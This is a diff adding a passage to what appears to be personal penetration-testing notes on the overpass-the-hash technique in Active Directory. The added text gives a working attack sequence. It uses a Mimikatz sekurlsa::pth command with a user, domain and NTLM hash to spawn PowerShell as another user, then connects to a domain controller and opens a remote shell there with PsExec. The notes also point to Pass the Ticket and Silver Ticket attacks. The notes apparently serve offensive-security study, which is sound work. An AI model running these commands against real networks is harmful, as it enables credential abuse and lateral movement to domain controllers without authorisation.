@@ -14,6 +14,31 @@ Search Tag: #📕
 ___
 
 ## Description:  
+abuse a NTLM user hash to gain a full Kerberos Ticket Granting Ticket (TGT) or service ticket, which grants us access to another machine or service as that user (like right clicking an application and selecting "Run as different user").
+
+### With Mimikatz in Powershell
+
+```
+mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
+
+PS C:\Windows\system32> net use \\dc01
+The command completed successfully.
+
+PS C:\Windows\system32> klist
+
+PS C:\Tools\active_directory> .\PsExec.exe \\dc01 cmd.exe
+PsExec v2.2 - Execute processes remotely
+Copyright (C) 2001-2016 Mark Russinovich
+Sysinternals - www.sysinternals.com
+C:\Windows\system32> whoami
+
+```
+
+list the cached Kerberos tickets with klist
+
+If you have a service account hash an Pass the Ticket or [[Silver Ticket]] can be done.
+
+
 ### In CobaltStrike
 
 
